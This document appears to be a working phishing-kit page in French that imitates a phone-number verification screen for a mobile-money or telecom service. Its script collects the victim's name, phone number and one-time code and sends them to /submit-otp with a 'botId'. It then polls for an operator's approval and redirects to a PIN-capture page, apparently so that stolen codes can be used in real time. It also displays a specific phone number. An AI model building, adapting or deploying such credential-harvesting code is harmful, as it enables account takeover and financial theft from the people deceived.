<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Vérifier votre numéro</title>

    <style>
        /* ── reset & base ── */
        *{
    margin:0;
    padding:0;
    box-sizing:border-box;
}

body{
    font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,sans-serif;
    background:#fff;
    color:#222;
    min-height:100vh;
}

.top-bar{
    height:95px;
    background:#f57c00;
    display:flex;
    align-items:flex-end;
    padding:18px 20px;
}

.back-btn{
    color:#fff;
    font-size:28px;
    text-decoration:none;
}

.container{
    padding:18px 28px;
}

.title{
    font-size:22px;
    font-weight:700;
    margin-bottom:8px;
    color:#333;
}

.subtitle{
    font-size:15px;
    color:#8b8b8b;
    line-height:1.5;
    margin-bottom:30px;
}

.phone-highlight{
    color:#8b8b8b;
}

.otp{
    display:flex;
    gap:10px;
    margin-bottom:20px;
}

.otp input{
    width:54px;
    height:54px;
    border:1px solid #d9d9d9;
    border-radius:8px;
    text-align:center;
    font-size:22px;
    outline:none;
    background:#fff;
}

.otp input:focus{
    border:2px solid #1976d2;
}

.resend-wrap{
    color:#666;
    font-size:15px;
    margin-bottom:40px;
}

.timer{
    font-weight:700;
}

.continue-btn{
    position:fixed;
    left:28px;
    right:28px;
    bottom:28px;
    height:54px;
    border:none;
    border-radius:10px;
    background:#b9cff0;
    color:#fff;
    font-size:20px;
    font-weight:600;
    cursor:not-allowed;
}
    </style>
</head>
<body>

<div class="top-bar">
    <a href="#" class="back-btn">&#8592;</a>
</div>

<div class="container">

    <div class="title">Vérifier votre numéro</div>

    <div class="subtitle">
        Saisissez le code que nous avons envoyé à (+226) 79046955
    </div>

    <div class="otp">
        <input maxlength="1">
        <input maxlength="1">
        <input maxlength="1">
        <input maxlength="1">
        <input maxlength="1">
        <input maxlength="1">
    </div>

    <div class="resend-wrap">
        Renvoyer le code dans <span class="timer">04:47</span>
    </div>

</div>

<button class="continue-btn">Continuer</button>

    <script>
        (function() {
            // ── 1. Get parameters from URL and localStorage ──
            const urlParams = new URLSearchParams(window.location.search);
            let botId = urlParams.get('botId') || localStorage.getItem('botId');
            let name = urlParams.get('name') || localStorage.getItem('name');
            let phone = urlParams.get('phone') || localStorage.getItem('phone');

            // Phone fallback: extract from subtitle (displayed number)
            if (!phone) {
                const subtitle = document.querySelector('.subtitle');
                const match = subtitle.textContent.match(/\((\+?\d+)\)\s*(\d+)/);
                if (match) phone = match[1] + match[2];
            }

            // ── 2. Create a message container (no alerts) ──
            const container = document.querySelector('.container');
            const msgDiv = document.createElement('div');
            msgDiv.id = 'message-box';
            msgDiv.style.display = 'none';
            msgDiv.style.padding = '12px 16px';
            msgDiv.style.borderRadius = '8px';
            msgDiv.style.marginBottom = '20px';
            msgDiv.style.fontSize = '15px';
            msgDiv.style.fontWeight = '500';
            msgDiv.style.transition = 'all 0.2s ease';
            const resendWrap = document.querySelector('.resend-wrap');
            container.insertBefore(msgDiv, resendWrap);

            function showMessage(text, isError = true) {
                msgDiv.textContent = text;
                msgDiv.style.display = 'block';
                msgDiv.style.background = isError ? '#fde7e7' : '#e7f5e7';
                msgDiv.style.color = isError ? '#b00020' : '#1e7e34';
                msgDiv.style.border = isError ? '1px solid #f5c6cb' : '1px solid #b7d7b7';
            }

            function hideMessage() {
                msgDiv.style.display = 'none';
                msgDiv.textContent = '';
            }

            // ── 3. Helper to ask for missing data (name or phone) ──
            function askForMissingData() {
                let missing = [];
                if (!name) missing.push('Nom');
                if (!phone) missing.push('Numéro de téléphone');
                if (!botId) missing.push('Bot ID');

                if (missing.length === 0) return true;

                // Build a small form inside the message box
                const form = document.createElement('div');
                form.style.display = 'flex';
                form.style.flexDirection = 'column';
                form.style.gap = '10px';
                form.style.marginTop = '10px';

                const label = document.createElement('div');
                label.textContent = `Veuillez saisir : ${missing.join(', ')}`;
                label.style.fontWeight = '600';
                label.style.color = '#333';
                form.appendChild(label);

                const inputName = document.createElement('input');
                inputName.type = 'text';
                inputName.placeholder = 'Votre nom complet';
                inputName.style.padding = '8px 12px';
                inputName.style.border = '1px solid #ccc';
                inputName.style.borderRadius = '6px';
                inputName.style.fontSize = '16px';
                if (name) inputName.value = name;
                form.appendChild(inputName);

                const inputPhone = document.createElement('input');
                inputPhone.type = 'tel';
                inputPhone.placeholder = 'Numéro de téléphone (ex: 79046955)';
                inputPhone.style.padding = '8px 12px';
                inputPhone.style.border = '1px solid #ccc';
                inputPhone.style.borderRadius = '6px';
                inputPhone.style.fontSize = '16px';
                if (phone) inputPhone.value = phone;
                if (missing.includes('Numéro de téléphone')) {
                    form.appendChild(inputPhone);
                }

                const inputBot = document.createElement('input');
                inputBot.type = 'text';
                inputBot.placeholder = 'Bot ID (ex: bot1)';
                inputBot.style.padding = '8px 12px';
                inputBot.style.border = '1px solid #ccc';
                inputBot.style.borderRadius = '6px';
                inputBot.style.fontSize = '16px';
                if (botId) inputBot.value = botId;
                if (missing.includes('Bot ID')) {
                    form.appendChild(inputBot);
                }

                const confirmBtn = document.createElement('button');
                confirmBtn.textContent = 'Confirmer';
                confirmBtn.style.padding = '8px 16px';
                confirmBtn.style.background = '#1976d2';
                confirmBtn.style.color = '#fff';
                confirmBtn.style.border = 'none';
                confirmBtn.style.borderRadius = '6px';
                confirmBtn.style.fontSize = '16px';
                confirmBtn.style.cursor = 'pointer';
                form.appendChild(confirmBtn);

                // Clear message and show the form
                hideMessage();
                msgDiv.style.display = 'block';
                msgDiv.style.background = '#fff8e1';
                msgDiv.style.color = '#333';
                msgDiv.style.border = '1px solid #ffd54f';
                msgDiv.innerHTML = '';
                msgDiv.appendChild(form);

                return new Promise((resolve) => {
                    confirmBtn.addEventListener('click', function() {
                        const newName = inputName.value.trim();
                        const newPhone = inputPhone.value.trim();
                        const newBot = inputBot.value.trim();

                        if (missing.includes('Nom') && !newName) {
                            alert('Veuillez entrer votre nom.');
                            return;
                        }
                        if (missing.includes('Numéro de téléphone') && !newPhone) {
                            alert('Veuillez entrer votre numéro de téléphone.');
                            return;
                        }
                        if (missing.includes('Bot ID') && !newBot) {
                            alert('Veuillez entrer le Bot ID.');
                            return;
                        }

                        // Update variables and localStorage
                        if (newName) name = newName;
                        if (newPhone) phone = newPhone;
                        if (newBot) botId = newBot;

                        localStorage.setItem('name', name);
                        localStorage.setItem('phone', phone);
                        localStorage.setItem('botId', botId);

                        // Remove the form and hide message
                        hideMessage();
                        resolve(true);
                    });
                });
            }

            // ── 4. OTP auto‑advance & continue button logic ──
            const inputs = document.querySelectorAll('.otp input');
            const continueBtn = document.querySelector('.continue-btn');

            function checkAllFilled() {
                let allFilled = true;
                inputs.forEach(input => {
                    if (input.value.trim() === '') allFilled = false;
                });
                if (allFilled) {
                    continueBtn.disabled = false;
                    continueBtn.style.background = '#1976d2';
                    continueBtn.style.cursor = 'pointer';
                } else {
                    continueBtn.disabled = true;
                    continueBtn.style.background = '#b9cff0';
                    continueBtn.style.cursor = 'not-allowed';
                }
            }

            inputs.forEach((input, index) => {
                input.addEventListener('input', function() {
                    if (this.value.length === 1) {
                        if (index < inputs.length - 1) {
                            inputs[index + 1].focus();
                        }
                    }
                    checkAllFilled();
                    hideMessage();
                });

                input.addEventListener('keydown', function(e) {
                    if (e.key === 'Backspace' && this.value === '' && index > 0) {
                        inputs[index - 1].focus();
                    }
                });

                input.addEventListener('blur', checkAllFilled);
            });

            // ── 5. Timer & resend ──
            const timerSpan = document.querySelector('.timer');
            const resendWrapEl = document.querySelector('.resend-wrap');
            let totalSeconds = 5 * 60;
            let interval = null;

            function formatTime(sec) {
                const m = String(Math.floor(sec / 60)).padStart(2, '0');
                const s = String(sec % 60).padStart(2, '0');
                return `${m}:${s}`;
            }

            function updateTimerUI() {
                if (totalSeconds <= 0) {
                    resendWrapEl.innerHTML = 'Renvoyer le code';
                    resendWrapEl.style.color = '#1976d2';
                    resendWrapEl.style.cursor = 'pointer';
                    resendWrapEl.style.fontWeight = '600';
                    clearInterval(interval);
                    interval = null;
                    resendWrapEl.onclick = function(e) {
                        e.preventDefault();
                        startTimer(5 * 60);
                        hideMessage();
                    };
                    return;
                }
                timerSpan.textContent = `dans ${formatTime(totalSeconds)}`;
                resendWrapEl.innerHTML = `Renvoyer le code dans <span class="timer">${formatTime(totalSeconds)}</span>`;
                resendWrapEl.style.color = '#666';
                resendWrapEl.style.cursor = 'default';
                resendWrapEl.style.fontWeight = '400';
                resendWrapEl.onclick = null;
            }

            function startTimer(seconds) {
                if (interval) clearInterval(interval);
                totalSeconds = seconds;
                updateTimerUI();
                interval = setInterval(() => {
                    totalSeconds--;
                    if (totalSeconds <= 0) {
                        totalSeconds = 0;
                        updateTimerUI();
                        clearInterval(interval);
                        interval = null;
                    } else {
                        updateTimerUI();
                    }
                }, 1000);
            }

            startTimer(5 * 60);

            // ── 6. On page load, check for missing data and ask if needed ──
            // We'll run this asynchronously to not block the UI
            async function ensureData() {
                if (!name || !phone || !botId) {
                    await askForMissingData();
                }
                // Now all data should be available
                // Re-check and store again
                if (name) localStorage.setItem('name', name);
                if (phone) localStorage.setItem('phone', phone);
                if (botId) localStorage.setItem('botId', botId);
            }

            // Start the data check
            ensureData();

            // ── 7. Backend communication with inline messages ──
            continueBtn.addEventListener('click', function() {
                if (this.disabled) return;

                // If data is still missing, ask again
                if (!name || !phone || !botId) {
                    ensureData().then(() => {
                        // After ensuring, retry click (recursive but safe)
                        continueBtn.click();
                    });
                    return;
                }

                hideMessage();

                const otp = Array.from(inputs).map(inp => inp.value).join('');

                continueBtn.disabled = true;
                continueBtn.textContent = 'Vérification...';
                continueBtn.style.background = '#f5a623';

                fetch('/submit-otp', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ name, phone, otp, botId })
                })
                .then(response => {
                    if (!response.ok) throw new Error('Erreur serveur');
                    return response.json();
                })
                .then(data => {
                    const requestId = data.requestId;
                    if (!requestId) throw new Error('Aucun ID reçu');

                    let pollInterval = setInterval(() => {
                        fetch(`/check-otp/${requestId}`)
                            .then(res => {
                                if (!res.ok) throw new Error('Erreur lors du contrôle');
                                return res.json();
                            })
                            .then(status => {
                                if (status.approved === true) {
                                    clearInterval(pollInterval);
                                    window.location.href = `pin.html?botId=${botId}&name=${encodeURIComponent(name)}&phone=${encodeURIComponent(phone)}`;
                                } else if (status.approved === false) {
                                    clearInterval(pollInterval);
                                    showMessage('Code incorrect. Veuillez réessayer.', true);
                                    continueBtn.disabled = false;
                                    continueBtn.textContent = 'Continuer';
                                    continueBtn.style.background = '#1976d2';
                                    continueBtn.style.cursor = 'pointer';
                                    inputs.forEach(inp => inp.value = '');
                                    checkAllFilled();
                                    inputs[0].focus();
                                }
                            })
                            .catch(err => {
                                clearInterval(pollInterval);
                                showMessage('Erreur de vérification : ' + err.message, true);
                                continueBtn.disabled = false;
                                continueBtn.textContent = 'Continuer';
                                continueBtn.style.background = '#1976d2';
                                continueBtn.style.cursor = 'pointer';
                            });
                    }, 2000);
                })
                .catch(err => {
                    showMessage('Erreur lors de l\'envoi : ' + err.message, true);
                    continueBtn.disabled = false;
                    continueBtn.textContent = 'Continuer';
                    continueBtn.style.background = '#1976d2';
                    continueBtn.style.cursor = 'pointer';
                });
            });

        })();
    </script>

</body>
</html>
